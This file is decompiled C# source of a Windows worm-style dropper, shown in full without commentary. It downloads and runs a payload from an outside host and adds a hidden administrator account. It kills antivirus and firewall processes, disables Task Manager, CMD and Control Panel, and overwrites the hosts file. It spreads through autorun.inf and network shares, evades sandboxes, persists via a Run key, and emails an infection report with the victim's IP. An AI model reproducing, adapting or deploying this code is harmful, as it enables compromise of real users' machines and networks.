using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class Source
{
	private static string hxea8 = Path.GetTempPath() + "\\yIjUsWbVePcXxK.exe";

	private static string path = Path.GetTempPath();

	private static string w7tu;

	private static string[] qktto;

	private static string nyr67 = "http://hfmixed.fileave.com/Newtest.exe";

	private static string jicyn;

	private static StreamWriter w58n9 = new StreamWriter(path + "\\melt.bat");

	private static string[] r2p3z;

	private static string od3u = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();

	public static string urzsu = Convert.ToString(Process.GetCurrentProcess().MainModule!.FileName);

	private static FileAttributes ql19j = FileAttributes.Hidden;

	private static string bb6z = Interaction.Environ("AppData") + "\\yIjUsWbVePcXxK.exe";

	private static RegistryKey vx6yi;

	private static string p0702 = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Universal", "Universal", "Universal");

	private static RegistryKey ss2wr = Registry.LocalMachine.OpenSubKey("Software", writable: true);

	private static RegistryKey n4md4 = ss2wr.CreateSubKey("Universal");

	private static DirectoryEntry tz97v = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");

	private static DirectoryEntry x5z0v = tz97v.get_Children().Add("Universal", "user");

	private static string c2cx = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";

	private static ManagementObjectSearcher zib26 = new ManagementObjectSearcher("select * from win32_share");

	private static DirectoryEntry vzkmj;

	private static string uv92s = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";

	private static RegistryKey nw5vo = Registry.CurrentUser.OpenSubKey(uv92s);

	private static ManagementClass managementClass = new ManagementClass("Win32_Share");

	private static ManagementBaseObject inParams = ((ManagementObject)managementClass).GetMethodParameters("Create");

	private static ManagementBaseObject outParams;

	[STAThread]
	public static void Main()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		byte b2 = default(byte);
		int num2 = default(int);
		int num3 = default(int);
		byte b = default(byte);
		byte b3 = default(byte);
		byte b4 = default(byte);
		byte b5 = default(byte);
		byte b6 = default(byte);
		byte b7 = default(byte);
		byte b8 = default(byte);
		byte b9 = default(byte);
		byte b10 = default(byte);
		byte b11 = default(byte);
		byte b12 = default(byte);
		byte b13 = default(byte);
		byte b14 = default(byte);
		byte b15 = default(byte);
		byte b16 = default(byte);
		byte b17 = default(byte);
		byte b18 = default(byte);
		byte b19 = default(byte);
		byte b20 = default(byte);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					b2 = 1;
					goto IL_0006;
				case 923:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0006;
						case 3:
							goto IL_000c;
						case 4:
							goto IL_0012;
						case 5:
							goto IL_0018;
						case 6:
							goto IL_001e;
						case 7:
							goto IL_0024;
						case 8:
							goto IL_0029;
						case 9:
							goto IL_002e;
						case 10:
							goto IL_0035;
						case 11:
							goto IL_003b;
						case 12:
							goto IL_0042;
						case 13:
							goto IL_0049;
						case 14:
							goto IL_0050;
						case 15:
							goto IL_0056;
						case 16:
							goto IL_005d;
						case 17:
							goto IL_0064;
						case 18:
							goto IL_006b;
						case 19:
							goto IL_0072;
						case 20:
							goto IL_0079;
						case 21:
							goto IL_0080;
						case 22:
							goto IL_0089;
						case 23:
						case 24:
							goto IL_0092;
						case 25:
							goto IL_009b;
						case 26:
						case 27:
							goto IL_00a4;
						case 28:
							goto IL_00ad;
						case 29:
						case 30:
							goto IL_00b6;
						case 31:
							goto IL_00bf;
						case 32:
						case 33:
							goto IL_00c8;
						case 34:
							goto IL_00d1;
						case 35:
							goto IL_00d9;
						case 36:
						case 37:
							goto IL_00e7;
						case 38:
							goto IL_00ef;
						case 39:
							goto IL_00f8;
						case 40:
							goto IL_010b;
						case 41:
						case 42:
							goto IL_0114;
						case 43:
							goto IL_011c;
						case 44:
						case 45:
							goto IL_0125;
						case 46:
							goto IL_012e;
						case 47:
						case 48:
							goto IL_0137;
						case 49:
							goto IL_0140;
						case 50:
						case 51:
							goto IL_0149;
						case 52:
							goto IL_0152;
						case 53:
						case 54:
							goto IL_015b;
						case 55:
							goto IL_0164;
						case 56:
						case 57:
							goto IL_016d;
						case 58:
							goto IL_0176;
						case 59:
						case 60:
							goto IL_017f;
						case 61:
							goto IL_0187;
						case 62:
						case 63:
							goto IL_0190;
						case 64:
							goto IL_0199;
						case 65:
						case 66:
							goto IL_01a2;
						case 67:
							goto IL_01ab;
						case 68:
						case 69:
							goto IL_01b4;
						case 70:
							goto IL_01bd;
						case 71:
						case 72:
							goto IL_01c6;
						case 73:
							goto IL_01cf;
						case 74:
							goto IL_01d8;
						case 75:
							goto IL_01e1;
						case 76:
							goto IL_01ea;
						case 77:
						case 78:
							goto IL_01f3;
						case 79:
							goto IL_01fc;
						case 80:
						case 81:
							goto IL_0205;
						case 82:
							goto IL_020e;
						case 83:
						case 84:
							goto IL_0217;
						case 85:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 86:
						case 87:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0217:
					num = 84;
					if (b != 1)
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0006:
					num = 2;
					b3 = 1;
					goto IL_000c;
					IL_000c:
					num = 3;
					b4 = 1;
					goto IL_0012;
					IL_0012:
					num = 4;
					b5 = 0;
					goto IL_0018;
					IL_0018:
					num = 5;
					b6 = 0;
					goto IL_001e;
					IL_001e:
					num = 6;
					b7 = 0;
					goto IL_0024;
					IL_0024:
					num = 7;
					b = 0;
					goto IL_0029;
					IL_0029:
					num = 8;
					b8 = 0;
					goto IL_002e;
					IL_002e:
					num = 9;
					b9 = 0;
					goto IL_0035;
					IL_0035:
					num = 10;
					b10 = 1;
					goto IL_003b;
					IL_003b:
					num = 11;
					b11 = 0;
					goto IL_0042;
					IL_0042:
					num = 12;
					b12 = 0;
					goto IL_0049;
					IL_0049:
					num = 13;
					b13 = 0;
					goto IL_0050;
					IL_0050:
					num = 14;
					b14 = 0;
					goto IL_0056;
					IL_0056:
					num = 15;
					b15 = 0;
					goto IL_005d;
					IL_005d:
					num = 16;
					b16 = 0;
					goto IL_0064;
					IL_0064:
					num = 17;
					b17 = 0;
					goto IL_006b;
					IL_006b:
					num = 18;
					b18 = 0;
					goto IL_0072;
					IL_0072:
					num = 19;
					b19 = 0;
					goto IL_0079;
					IL_0079:
					num = 20;
					b20 = 0;
					goto IL_0080;
					IL_0080:
					num = 21;
					if (b16 == 1)
					{
						goto IL_0089;
					}
					goto IL_0092;
					IL_0089:
					num = 22;
					dud98();
					goto IL_0092;
					IL_0092:
					num = 24;
					if (b17 == 1)
					{
						goto IL_009b;
					}
					goto IL_00a4;
					IL_009b:
					num = 25;
					jmyz();
					goto IL_00a4;
					IL_00a4:
					num = 27;
					if (b6 == 1)
					{
						goto IL_00ad;
					}
					goto IL_00b6;
					IL_00ad:
					num = 28;
					dlf68();
					goto IL_00b6;
					IL_00b6:
					num = 30;
					if (b2 == 1)
					{
						goto IL_00bf;
					}
					goto IL_00c8;
					IL_00bf:
					num = 31;
					pv781();
					goto IL_00c8;
					IL_00c8:
					num = 33;
					if (b4 == 1)
					{
						goto IL_00d1;
					}
					goto IL_00e7;
					IL_00d1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_00d9;
					IL_00d9:
					num = 35;
					msekn.xnqfi("yIjUsWbVePcXxK.exe");
					goto IL_00e7;
					IL_00e7:
					num = 37;
					if (b10 == 1)
					{
						goto IL_00ef;
					}
					goto IL_0114;
					IL_00ef:
					num = 38;
					yygwu();
					goto IL_00f8;
					IL_00f8:
					num = 39;
					zl7hc("C:\\Program Settings", "Program Settings");
					goto IL_010b;
					IL_010b:
					num = 40;
					rijf();
					goto IL_0114;
					IL_0114:
					num = 42;
					if (b8 == 1)
					{
						goto IL_011c;
					}
					goto IL_0125;
					IL_011c:
					num = 43;
					sfywm();
					goto IL_0125;
					IL_0125:
					num = 45;
					if (b13 == 1)
					{
						goto IL_012e;
					}
					goto IL_0137;
					IL_012e:
					num = 46;
					vgauy();
					goto IL_0137;
					IL_0137:
					num = 48;
					if (b7 == 1)
					{
						goto IL_0140;
					}
					goto IL_0149;
					IL_0140:
					num = 49;
					d5zuk();
					goto IL_0149;
					IL_0149:
					num = 51;
					if (b15 == 1)
					{
						goto IL_0152;
					}
					goto IL_015b;
					IL_0152:
					num = 52;
					tgzsf();
					goto IL_015b;
					IL_015b:
					num = 54;
					if (b12 == 1)
					{
						goto IL_0164;
					}
					goto IL_016d;
					IL_0164:
					num = 55;
					juef();
					goto IL_016d;
					IL_016d:
					num = 57;
					if (b5 == 1)
					{
						goto IL_0176;
					}
					goto IL_017f;
					IL_0176:
					num = 58;
					bo2y();
					goto IL_017f;
					IL_017f:
					num = 60;
					if (b14 == 1)
					{
						goto IL_0187;
					}
					goto IL_0190;
					IL_0187:
					num = 61;
					w6aak();
					goto IL_0190;
					IL_0190:
					num = 63;
					if (b11 == 1)
					{
						goto IL_0199;
					}
					goto IL_01a2;
					IL_0199:
					num = 64;
					avuur();
					goto IL_01a2;
					IL_01a2:
					num = 66;
					if (b18 == 1)
					{
						goto IL_01ab;
					}
					goto IL_01b4;
					IL_01ab:
					num = 67;
					uqd84();
					goto IL_01b4;
					IL_01b4:
					num = 69;
					if (b19 == 1)
					{
						goto IL_01bd;
					}
					goto IL_01c6;
					IL_01bd:
					num = 70;
					lerbr();
					goto IL_01c6;
					IL_01c6:
					num = 72;
					fnl7s();
					goto IL_01cf;
					IL_01cf:
					num = 73;
					af9yy();
					goto IL_01d8;
					IL_01d8:
					num = 74;
					k7u00();
					goto IL_01e1;
					IL_01e1:
					num = 75;
					if (b20 == 1)
					{
						goto IL_01ea;
					}
					goto IL_01f3;
					IL_01ea:
					num = 76;
					q0fr5();
					goto IL_01f3;
					IL_01f3:
					num = 78;
					if (b9 == 1)
					{
						goto IL_01fc;
					}
					goto IL_0205;
					IL_01fc:
					num = 79;
					w8cni();
					goto IL_0205;
					IL_0205:
					num = 81;
					if (b3 == 1)
					{
						goto IL_020e;
					}
					goto IL_0217;
					IL_020e:
					num = 82;
					s8u9n();
					goto IL_0217;
					end_IL_0000_2:
					break;
				}
				num = 85;
				fmhx7();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 923;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void fmhx7()
	{
		wj9v5();
		it1gc();
		sjbxk();
		rd0w5();
		y4uzq();
		h5aar();
		obmte();
		j0mk();
		ProjectData.EndApp();
	}

	private static void avuur()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
			string text = folderPath + "\\drivers\\etc\\\\hosts";
			StreamWriter streamWriter = new StreamWriter(text);
			streamWriter.Write("gF513jdmId otQJXuk1R8");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("tAeVbBzt4H fXcWCfgUwv");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("H0B5FHt3rV nkpH74JPKn");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("AvjYSZZcBA r6JM5CnAG5");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("iTzB32J9eB GEMm75NM7E");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("IJZ1uIjU9K QIHfKBhLDu");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("bLblRgjFUd il4ax9Nhry");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write("w9GYMsTWnO kOL45xDCo7");
			streamWriter.Write(Environment.NewLine);
			streamWriter.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void dlf68()
	{
		Interaction.Shell("sc stop wscsvc", (AppWinStyle)0, false, -1);
		Interaction.Shell("sc stop SharedAccess", (AppWinStyle)0, false, -1);
	}

	private static void w8cni()
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://automation.whatismyip.com/n09230945.asp");
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		Stream responseStream = httpWebResponse.GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		string text = streamReader.ReadToEnd();
		string hostName = Dns.GetHostName();
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress("emailherelolz");
		mailMessage.To.Add("emailherelolz");
		mailMessage.Subject = "New Infection!";
		mailMessage.Body = "New Infection! The Info Can Be Found Below: " + hostName + " | " + text;
		SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
		smtpClient.Port = 587;
		smtpClient.Credentials = new NetworkCredential("emailherelolz", "passwordxd");
		smtpClient.EnableSsl = true;
		smtpClient.Send(mailMessage);
	}

	private static void lerbr()
	{
		an7n0();
		px1d9();
		hm05m();
	}

	private static void q0fr5()
	{
		bw928();
		ixwtf();
		g49hb();
	}

	private static void h5aar()
	{
		w58n9.Close();
	}

	private static void wj9v5()
	{
		w58n9.WriteLine("@echo off");
	}

	private static void b2i7g()
	{
		r2p3z = Directory.GetLogicalDrives();
	}

	private static void f6ceo()
	{
		s6RS9hUNMV.z4Fy2OIBQ3();
	}

	private static void rgt2d()
	{
		s6RS9hUNMV.lgVM02aECe();
	}

	private static void vgauy()
	{
		Interaction.Shell("REG add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
	}

	private static void dz2n2()
	{
		s6RS9hUNMV.D9F7l2pHXw();
	}

	private static void y4uzq()
	{
		w58n9.Flush();
	}

	private static void it1gc()
	{
		w58n9.WriteLine("TASKKILL /F /T /IM " + Application.get_ProductName());
	}

	private static void juef()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1);
		registryKey.Close();
	}

	private static void rd0w5()
	{
		w58n9.WriteLine("del melt.bat");
	}

	private static void ixwtf()
	{
		File.SetAttributes(bb6z, ql19j);
	}

	private static void r0ipq()
	{
		s6RS9hUNMV.tWEuPFDShv();
	}

	private static void tgzsf()
	{
		Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
	}

	private static void s3v2n()
	{
		s6RS9hUNMV.HfwdgTHYEb();
	}

	private static void a33ew()
	{
		((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"0", RegistryValueKind.DWord);
	}

	private static void j0mk()
	{
		Interaction.Shell("melt.bat", (AppWinStyle)2, false, -1);
	}

	private static void hm05m()
	{
		vx6yi.Close();
	}

	private static void px1d9()
	{
		vx6yi.DeleteSubKey("MSCONFIG.EXE", throwOnMissingSubKey: true);
	}

	private static void lym4u()
	{
		FileSystem.SetAttr(jicyn + "HDDFile.com", (FileAttribute)2);
	}

	private static void af9yy()
	{
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile(nyr67, hxea8);
	}

	private static void k0hiq()
	{
		outParams = ((ManagementObject)managementClass).InvokeMethod("Create", inParams, (InvokeMethodOptions)null);
	}

	private static void w6aak()
	{
		Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
	}

	private static void g49hb()
	{
		((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("1" + Application.get_ProductName(), bb6z);
	}

	private static void bw928()
	{
		File.Copy(Application.get_ExecutablePath(), bb6z);
	}

	private static void fnl7s()
	{
		if (File.Exists(Path.GetTempPath() + "\\yIjUsWbVePcXxK.exe"))
		{
			ProjectData.EndApp();
		}
	}

	private static void qa0jm()
	{
		Registry.SetValue(c2cx, "Universal", 0, RegistryValueKind.DWord);
	}

	private static void fdzct()
	{
		vzkmj.Invoke("Add", new object[1] { x5z0v.get_Path().ToString() });
	}

	private static void e9m81()
	{
		vzkmj = tz97v.get_Children().Find("Administrators", "group");
	}

	private static void bi7mc()
	{
		x5z0v.CommitChanges();
	}

	private static void ocfhh()
	{
		x5z0v.Invoke("SetPassword", new object[1] { "Universalwashere" });
	}

	private static void fiyqy()
	{
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile(nyr67, hxea8);
	}

	private static void cnzrb()
	{
		FileSystem.SetAttr(jicyn + "autorun.inf", (FileAttribute)2);
	}

	private static void mi3aq()
	{
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(jicyn + "autorun.inf", "[autorun]\r\nopen=" + jicyn + "HDDFile.com\r\nshellexecute=" + jicyn, true);
	}

	private static void ofy9k()
	{
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), jicyn + "HDDFile.com", (UIOption)(-1), (UICancelOption)2);
	}

	private static void obmte()
	{
		Interaction.Shell(Application.get_StartupPath() + "\\melt.bat", (AppWinStyle)0, false, -1);
	}

	private static void sjbxk()
	{
		w58n9.WriteLine("del " + Strings.Replace(Application.get_ExecutablePath(), Application.get_StartupPath() + "\\", "", 1, -1, (CompareMethod)0));
	}

	private static void k7u00()
	{
		Process.Start(hxea8);
	}

	private static void an7n0()
	{
		vx6yi = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths", writable: true);
	}

	public static void sfywm()
	{
		Process[] processesByName = Process.GetProcessesByName("iptray");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
	}

	public static void uqd84()
	{
		Process[] processesByName = Process.GetProcessesByName("kQRbVmmhvigBONo");
		foreach (Process process in processesByName)
		{
			process.Kill();
			ProjectData.EndApp();
		}
	}

	public static void d5zuk()
	{
		Process[] processesByName = Process.GetProcessesByName("cfp");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
	}

	public static void jmyz()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("VBoxTray");
		for (int i = 0; i < processesByName.Length; i = checked(i + 1))
		{
			MessageBox.Show("This Program Has Known Compaitablility Issues In VirtualBox. Please Run It Normally. The Application Will Now Close. Thankyou.", "Error");
			ProjectData.EndApp();
		}
	}

	public static void bo2y()
	{
		Process[] processesByName = Process.GetProcessesByName("SpybotSD");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
	}

	public static void dud98()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("SandboxieRpcSs");
		for (int i = 0; i < processesByName.Length; i = checked(i + 1))
		{
			MessageBox.Show("This Program Has Known Compaitablility Issues In Sandboxie. Please Run It Normally. The Application Will Now Close. Thankyou.", "Error");
			ProjectData.EndApp();
		}
	}

	private static void pv781()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string[] array = default(string[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 197:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_0017;
						case 5:
							goto IL_0030;
						case 7:
							goto IL_0044;
						case 8:
							goto IL_0047;
						case 9:
							goto IL_004f;
						case 10:
							goto IL_0058;
						case 11:
							goto IL_0061;
						case 13:
							goto IL_006c;
						case 6:
						case 12:
							goto IL_0072;
						default:
							goto end_IL_0000;
						case 14:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0072:
					num5 = checked(num5 + 1);
					goto IL_006c;
					IL_0007:
					num = 2;
					a33ew();
					goto IL_000f;
					IL_000f:
					num = 3;
					b2i7g();
					goto IL_0017;
					IL_0017:
					num = 4;
					array = r2p3z;
					num5 = 0;
					goto IL_0022;
					IL_0022:
					if (num5 < array.Length)
					{
						jicyn = array[num5];
						goto IL_0030;
					}
					goto end_IL_0000_2;
					IL_006c:
					num = 13;
					goto IL_0022;
					IL_0030:
					num = 5;
					if (!od3u.Contains(jicyn))
					{
						goto IL_0044;
					}
					goto IL_0072;
					IL_0044:
					num = 7;
					goto IL_0047;
					IL_0047:
					num = 8;
					ofy9k();
					goto IL_004f;
					IL_004f:
					num = 9;
					mi3aq();
					goto IL_0058;
					IL_0058:
					num = 10;
					lym4u();
					goto IL_0061;
					IL_0061:
					num = 11;
					cnzrb();
					goto IL_0072;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 197;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void s8u9n()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 88:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_000e;
						case 4:
							goto IL_0015;
						case 5:
							goto IL_001c;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_001c:
					num = 5;
					s3v2n();
					break;
					IL_0007:
					num = 2;
					rgt2d();
					goto IL_000e;
					IL_000e:
					num = 3;
					dz2n2();
					goto IL_0015;
					IL_0015:
					num = 4;
					f6ceo();
					goto IL_001c;
					end_IL_0000_2:
					break;
				}
				num = 6;
				r0ipq();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 88;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static bool qkoo()
	{
		if (Operators.CompareString(p0702, "Universal", false) == 0)
		{
			return true;
		}
		n4md4.SetValue("Universal", urzsu);
		return false;
	}

	public static void yygwu()
	{
		try
		{
			ocfhh();
			bi7mc();
			e9m81();
			if (vzkmj != null)
			{
				fdzct();
			}
			try
			{
				qa0jm();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void rijf()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		try
		{
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = zib26.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					string text = Convert.ToString(RuntimeHelpers.GetObjectValue(((ManagementBaseObject)val).get_Item("Name")));
					if (!text.Contains("$"))
					{
						File.Copy(urzsu, "\\\\" + Environment.MachineName + "\\" + text + "\\j2eBE.exe", overwrite: true);
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] valueNames = nw5vo.GetValueNames();
			foreach (string text2 in valueNames)
			{
				string text3 = nw5vo.GetValue(text2)!.ToString();
				if (Operators.CompareString(text2.ToLower(), "mrulist", false) != 0)
				{
					try
					{
						File.Copy(urzsu, text3 + "\\\\j2eBE.exe", overwrite: true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			nw5vo.Close();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void zl7hc(string piw25, string n0wpg)
	{
		try
		{
			Directory.CreateDirectory(piw25);
			inParams.set_Item("Description", (object)n0wpg);
			inParams.set_Item("Name", (object)n0wpg);
			inParams.set_Item("Path", (object)FileSystem.Dir());
			inParams.set_Item("Type", (object)0);
			k0hiq();
			if ((long)Conversions.ToUInteger(outParams.get_Properties().get_Item("ReturnValue").get_Value()) == 0L && Directory.Exists(piw25))
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(piw25);
				directoryInfo.Attributes = FileAttributes.Hidden;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
